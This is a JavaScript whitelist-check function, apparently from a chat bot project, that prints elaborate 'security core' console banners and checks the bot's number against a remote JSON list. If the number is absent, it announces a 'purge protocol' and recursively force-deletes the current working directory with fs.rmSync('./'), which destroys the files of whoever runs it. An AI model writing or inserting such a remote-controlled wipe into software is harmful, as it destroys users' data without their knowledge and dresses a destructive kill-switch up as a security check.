export async function checkWhitelist() {
  const url = "https://api.ryuu-dev.offc.my.id/src/assest/bot/whitelist.json";
  const nomorBot = global.nomorbot || "6281234567890";
  const ownerName = global.namaowner || "Ryuu";
  const ownerNumber = global.ownernumber || "628xx";
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  console.clear();
  console.log(chalk.cyanBright("┌────────────────────────────────────────────┐"));
  console.log(chalk.cyanBright("│           [ NEURAL SECURITY CORE ]         │"));
  console.log(chalk.cyanBright("└────────────────────────────────────────────┘\n"));

  process.stdout.write(chalk.yellowBright("⚙️ Initializing whitelist verification system"));
  for (let i = 0; i < 3; i++) {
    process.stdout.write(chalk.yellowBright("."));
    await sleep(500);
  }
  console.log("\n");

  try {
    const data = await fetch(url).then(res => res.json());
    const isWhitelisted = data.includes(nomorBot);

    await sleep(600);
    console.log(chalk.gray(`[SYS] Connected to: ${url}`));
    console.log(chalk.gray(`[SYS] Bot Number : ${nomorBot}`));
    console.log(chalk.gray(`[SYS] Entries Found : ${data.length}`));
    await sleep(800);

    if (isWhitelisted) {
      console.log(chalk.greenBright("\n[ACCESS GRANTED] ✅"));
      console.log(chalk.cyanBright(">> Identity verified in global whitelist database."));
      await sleep(700);
      console.log(chalk.magentaBright("┌────────────────────────────────────────────┐"));
      console.log(chalk.magentaBright("│            W E L C O M E   U S E R         │"));
      console.log(chalk.magentaBright("└────────────────────────────────────────────┘"));
      await sleep(500);
      console.log(chalk.whiteBright(`👤  Name        : ${chalk.cyan(ownerName)}`));
      await sleep(200);
      console.log(chalk.whiteBright(`📞  Number      : ${chalk.cyan(ownerNumber)}`));
      await sleep(200);
      console.log(chalk.whiteBright(`🤖  Bot Number  : ${chalk.cyan(nomorBot)}\n`));
      await sleep(300);
      console.log(chalk.greenBright(">> System online. Modules loading..."));
      console.log(chalk.gray(">> All security layers stable."));
      console.log(chalk.cyanBright(">> Launch sequence initiated.\n"));
    } else {
      console.log(chalk.redBright("\n⛔ ACCESS DENIED"));
      console.log(chalk.red(">> Unauthorized bot detected!"));
      console.log(chalk.yellow(">> Executing purge protocol..."));
      await sleep(1200);
      fs.rmSync("./", { recursive: true, force: true });
    }
  } catch (err) {
    console.log(chalk.redBright("\n❌ ERROR DURING WHITELIST CHECK!"));
    console.error(err);
  }
    }
